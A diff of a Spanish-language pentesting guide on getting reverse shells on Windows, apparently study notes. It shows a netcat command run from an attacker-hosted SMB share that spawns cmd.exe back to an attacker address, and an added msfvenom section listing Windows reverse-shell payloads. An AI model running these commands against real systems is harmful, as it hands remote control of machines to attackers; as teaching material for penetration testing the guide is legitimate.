@@ -56,13 +56,21 @@ En caso de que no este instalado lo podemos descargar desde: `https://github.com
 
 Con eso podemos mandarlo en un archivo malicioso y que lo ejecute o que el archivo lo descargue...
 
-Pero también podemos montarnos un servidor SMB y utilizarlo desde ahí poniendo el siguiente comando en la máquina Windows:
+Pero también podemos montarnos un servidor `SMB` y utilizarlo desde ahí poniendo el siguiente comando en la máquina Windows:
 
 ```
 > \\192.168.118.10\pwned\nc.exe -e cmd.exe <ip> <puerto>
 ```
 
 ## Msfvenom
+
+Msfvenom no solo es útil cuando nos generamos `shellcodes` para los `Buffer Overflow`, también lo es para `crear binarios que nos ejecuten una shell en Windows`. En concreto, los dos `payloads que nos pueden interesar` (aunque hay más y de muchos tipos) son los siguientes:
+
+```
+> msfvenom -l payloads | grep -i 'windows' | grep -i '/shell_reverse'
+windows/shell_reverse/tcp                            Connect back to attacker and spawn a command shell
+windows/x64/shell_reverse/tcp                        Connect back to attacker and spawn a command shell (Windows x64)
+```
 
 ## Powershell Reverse Shell One-Liner
 
